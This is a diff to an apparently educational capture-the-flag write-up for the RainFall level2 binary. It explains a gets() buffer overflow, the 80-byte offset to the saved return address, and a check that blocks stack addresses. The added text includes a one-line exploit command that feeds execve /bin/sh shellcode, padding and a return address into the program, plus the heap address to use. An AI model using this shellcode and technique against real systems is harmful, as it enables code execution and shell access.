@@ -44,9 +44,27 @@ level2@RainFall:~$ ./level2
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaJaaaaaaaa
 Segmentation fault (core dumped)
+level2@RainFall:~$ ./level2 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaJaaaaaaaaa
+Segmentation fault (core dumped)
+level2@RainFall:~$ ./level2 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaJaaaaaaaaaa
+Segmentation fault (core dumped)
+level2@RainFall:~$ ./level2 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaJaaaaaaaaaaa
+Segmentation fault (core dumped)
+level2@RainFall:~$ ./level2 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Segmentation fault (core dumped)
 ```
 
-These tests indicate a **buffer overflow vulnerability** (here triggered with 76 `a` characters), meaning there is **no protection** on the input buffer. And we can observe a **change of value** around the **65th character**.
+These tests indicate a **buffer overflow vulnerability** (here the **first one** triggered with 76 `a` characters), meaning there is **no protection** on the input buffer. And we can observe a **change of value** around the **65th character**.
+
+We can see a **first buffer overflow** with a **padding of 76**, but there are also **more buffer overflows** with **paddings** ranging from size **77 to 80** characters.
 
 ## 2. Analyze The Executable
 
@@ -87,8 +105,6 @@ If the check passes, the program **continues normally**. The input is printed us
 
 ## 3. Exploit Development
 
-### Stack Layout
-
 By analyzing the **assembly dump**, we can observe that `unaff_retaddr` is actually **stored** at offset `-0xc(%ebp)`:
 
 ```s
@@ -107,7 +123,11 @@ Since `unaff_retaddr` is a `4-byte` variable, it overlaps with `4 bytes` of `loc
 
 The `and` **operation** modifies these bytes, which explains the **unexpected characters** observed in the output (e.g. `[...]aaJ����`).
 
+This check is important for later, we will talk about it again.
+
 ---
+
+### Stack Layout
 
 So, the stack layout looks like this :
 
@@ -157,17 +177,58 @@ A **shellcode** is a **sequence of machine instructions** encoded in hexadecimal
 
 This shellcode is 21 bytes long, with this we can **define the structure of the payload** :
 ```
-<shellcode> + <buffer overflow> + <shellcode address>
-   21       +        59         + 			4				   = 84 bytes
-└─────────────┬────────────────┘
-			80 bytes
+<shellcode>	+ <padding> + <shellcode address>
+	21		+		59	+ 		4				   = 84 bytes
+└───────────┬───────────┘
+		80 bytes
 ```
+
+### Padding Size Explain
+
+Even though the **first segfault** appears with a **padding of 76 characters**, the **real offset** to `saved EIP` from `local_50` is **80 bytes**.
+
+```s
+   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
+   0x080484ea <+22>:	mov    %eax,(%esp)
+   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+```
+
+We can observe the `gets()` **argument** is at **`ebp - 0x4c`**, this argument being `local_50`.
+And **`0x4c`** is **`80` bytes** in decimal.  
+
+If there is segfault from 76 to 79, it is because the `saved EPB` is overwritten. Which causes some errors when returning to `main`. 
 
 ---
 
 ### Find the Shellcode Address
 
 The last piece of information required is the **address of the shellcode** in the memory.
+
+---
+
+#### Stack Addresses Protection
+
+```c
+	if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
+		printf("(%p)\n",unaff_retaddr);
+		_exit(1);
+	}
+```
+
+This **`if` statement** check that the **address given** does **not begin** with **`0xb0000000`**. This **prevent** the **shellcode** to be **stored** in the **stack**.
+So we need use the **shellcode stored** in the **heap** with `strdup()` instead.
+
+If we try to used the `local_50` address : `0xbffff70c`, we get this error :
+
+```bash
+level2@RainFall:~$ (python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'a' * 59 + '\x0c\xf7\xff\xbf'"; cat -) | ./level2 
+(0xbffff70c)
+id
+level2@RainFall:~$
+```
+
+---
+
 We can use the return value of `strdup()`, which duplicates the input (containing our shellcode) to the heap and returns its address.
 
 
@@ -186,6 +247,8 @@ With this `ltrace` output we can get the **return value** of `strdup()`, which i
 ```
 \x08\xa0\x04\x08
 ```
+
+---
 
 ### Overflow Visualization
 
